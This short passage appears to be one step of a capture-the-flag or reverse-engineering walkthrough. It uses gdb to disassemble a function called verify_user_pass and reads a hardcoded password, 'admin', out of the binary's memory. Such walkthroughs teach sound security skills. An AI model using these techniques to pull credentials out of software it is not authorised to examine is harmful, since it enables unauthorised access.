## Step 4: Disassemble `verify_user_pass`

```
(gdb) disas verify_user_pass
(gdb) x/s 0x80486b0
0x80486b0: "admin"
```

The function compares the first 5 bytes of the password buffer against `"admin"`. The expected password is **`admin`**.

